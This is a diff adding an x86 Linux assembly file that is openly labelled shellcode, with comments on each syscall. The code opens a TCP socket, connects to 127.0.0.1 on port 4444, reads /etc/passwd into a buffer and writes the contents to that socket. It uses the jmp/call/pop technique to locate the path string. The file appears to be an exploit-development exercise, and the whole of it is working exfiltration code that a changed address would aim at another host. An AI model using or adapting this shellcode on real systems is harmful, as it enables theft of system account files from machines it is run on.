@@ -1,0 +1,80 @@
+
+global _start
+
+section .text
+
+_start:
+	; Create a socket
+	; eax = 102 (socketcall), ebx = 1 (socket),
+	;   ecx = esp (2 (AF_INET), 1 (SOCK_STREAM), 0)
+	mov eax, 102	; syscall = socketcall
+	mov ebx, 1	; socket = 1
+	push dword 0	; args: protocol = 0
+	push dword 1	;       type = (SOCK_STREAM = 1)
+	push dword 2	;       domain = (AF_INET = 2)
+	mov ecx, esp	; pointer of args
+	int 0x80
+
+
+	; Save the returned socket to edi for later use, this is
+	;   the first argument of the following syscalls
+	xchg edi, eax	; eax (socket)  <=>  edi
+
+
+	; Connect to a remote port
+	push 0x0100007F	; socaddr: 0x0100007F = 127.0.0.1
+	push 0x5c110002	;          0x5c11 = port 4444, AF_INET = 0x0002
+	mov ecx, esp
+
+	; eax = 102 (socketcall), ebx = 3 (connect),
+	;   ecx = (socket, server struct, 16)
+	mov eax, 102	; syscall = socketcall
+	mov ebx, 3	; connect = 3
+	push dword 16	; sockaddr_in: size of sockaddr_in
+	push ecx	;              pointer of sockaddr_in
+	push edi	;              server socket
+	mov ecx, esp	; pointer of args
+	int 0x80
+
+	xchg edi, esi	; socket file descriptor is saved to esi
+
+
+	jmp short find_address
+
+shellcode:
+	; Open the file
+	; eax = 5 (open), ebx = pointer to path, ecx = 0 (flags)
+	mov eax, 5
+	pop ebx		; ebx = pointer to path
+	mov ecx, 0	; ecx = 0 (flags)
+	int 0x80
+
+	; Read the file
+	; eax = 3 (read), ebx = file descriptor from open file,
+	;   ecx = esp, buffer, where we read the file content
+	;   edx = 4096, buffer size
+	mov ebx, eax	; ebx = file descriptor
+	mov eax, 3
+	mov edi, esp	; buffer address is saved to edi
+	mov ecx, edi	; ecx = pointer to esp (buffer)
+	mov edx, 0x1000	; edx = 4096 (buffer size)
+	int 0x80
+
+	; Write to the socket
+	; eax = 4 (write), ebx = socket file descriptor (from esi)
+	;   ecx = pointer to buffer, edx = (eax return value from
+	;   previous syscall)
+	mov edx, eax	; edx = bytes read
+	mov eax, 4
+	mov ebx, esi	; esi contains the socket file descriptor
+	int 0x80
+
+	; Exit
+	; eax = 1 (exit), ebx = 0 (no error)
+	mov eax, 1
+	mov ebx, 0
+	int 0x80
+
+find_address:
+	call dword shellcode
+	path: db '/etc/passwd'
